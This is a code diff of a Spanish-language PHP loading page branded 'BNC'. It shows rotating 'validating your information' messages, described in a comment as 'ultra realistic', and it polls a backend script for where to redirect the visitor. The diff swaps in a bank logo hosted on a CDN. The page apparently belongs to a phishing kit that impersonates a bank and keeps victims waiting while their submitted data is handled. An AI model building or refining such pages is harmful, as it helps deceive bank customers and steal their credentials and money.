@@ -40,8 +40,10 @@ if (isset($_GET['check'])) {
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 <link rel="shortcut icon" href="iconero.ico">
 <title>BNC</title>
+
 <style>
 * { box-sizing: border-box; }
+
 body {
     margin: 0;
     height: 100vh;
@@ -51,21 +53,21 @@ body {
     align-items: center;
     font-family: system-ui, -apple-system, Segoe UI, Roboto, sans-serif;
 }
+
 /* CONTENEDOR */
 .loader-wrapper {
     display: flex;
     flex-direction: column;
     align-items: center;
 }
+
 /* SPINNER PREMIUM */
 .spinner {
     width: 90px;
     height: 90px;
     position: relative;
-    display: flex;
-    justify-content: center;
-    align-items: center;
 }
+
 /* ARO EXTERNO */
 .spinner::before {
     content: "";
@@ -74,6 +76,7 @@ body {
     border-radius: 50%;
     border: 3px solid #e2e2e2;
 }
+
 /* ARO ACTIVO */
 .spinner::after {
     content: "";
@@ -85,6 +88,7 @@ body {
     border-right-color: #031a4c;
     animation: spin 1.2s linear infinite;
 }
+
 /* LOGO CENTRAL */
 .logo {
     position: absolute;
@@ -97,15 +101,16 @@ body {
     overflow: hidden;
     background: #fff;
     box-shadow: 0 4px 12px rgba(0,0,0,0.08);
-    z-index: 10;
 }
+
 /* IMAGEN LOGO */
 .logo img {
-    width: 80%;
-    height: 80%;
+    width: 100%;
+    height: 100%;
     object-fit: cover;
     animation: fadeLogo 2.5s ease-in-out infinite;
 }
+
 /* TEXTO PRINCIPAL */
 .loading-text {
     margin-top: 30px;
@@ -115,6 +120,7 @@ body {
     text-align: center;
     transition: opacity 0.4s ease;
 }
+
 /* SUBTEXTO */
 .subtext {
     margin-top: 6px;
@@ -123,20 +129,24 @@ body {
     text-align: center;
     transition: opacity 0.4s ease;
 }
+
 /* DOTS */
 .loading-dots::after {
     content: "";
     animation: dots 1.5s infinite steps(4, end);
 }
+
 /* ANIMACIONES */
 @keyframes spin {
     to { transform: rotate(360deg); }
 }
+
 /* FADE SUAVE LOGO */
 @keyframes fadeLogo {
     0%, 100% { opacity: 1; }
     50% { opacity: 0.75; }
 }
+
 /* DOTS */
 @keyframes dots {
     0% { content: ""; }
@@ -146,23 +156,31 @@ body {
 }
 </style>
 </head>
+
 <body>
+
 <div class="loader-wrapper">
+
     <div class="spinner">
         <div class="logo">
-            <img src="bnc.png" alt="logo">
+            <img src="https://d1uubxdj0phgsa.cloudfront.net/Images/BNCLogoSmall-Big.png" alt="logo">
         </div>
     </div>
+
     <div class="loading-text" id="mainText">
         Validando información<span class="loading-dots"></span>
     </div>
+
     <div class="subtext" id="subText">
         Esto puede tardar unos segundos
     </div>
+
 </div>
+
 <script>
 const mainText = document.getElementById("mainText");
 const subText = document.getElementById("subText");
+
 /* MENSAJES DINAMICOS (ULTRA REALISTA) */
 const steps = [
     {
@@ -178,19 +196,26 @@ const steps = [
         sub: "Estamos asegurando tu acceso"
     }
 ];
+
 let stepIndex = 0;
+
 function changeStep() {
     stepIndex = (stepIndex + 1) % steps.length;
+
     mainText.style.opacity = 0;
     subText.style.opacity = 0;
+
     setTimeout(() => {
         mainText.innerHTML = steps[stepIndex].title + '<span class="loading-dots"></span>';
         subText.textContent = steps[stepIndex].sub;
+
         mainText.style.opacity = 1;
         subText.style.opacity = 1;
     }, 400);
 }
+
 setInterval(changeStep, 2500);
+
 /* REDIRECCION BACKEND */
 function checkRedirect() {
     fetch('load.php?id=<?php echo htmlspecialchars($request_id, ENT_QUOTES, "UTF-8"); ?>&check=1')
@@ -204,7 +229,9 @@ function checkRedirect() {
         })
         .catch(() => setTimeout(checkRedirect, 1500));
 }
+
 window.onload = checkRedirect;
 </script>
+
 </body>
 </html>
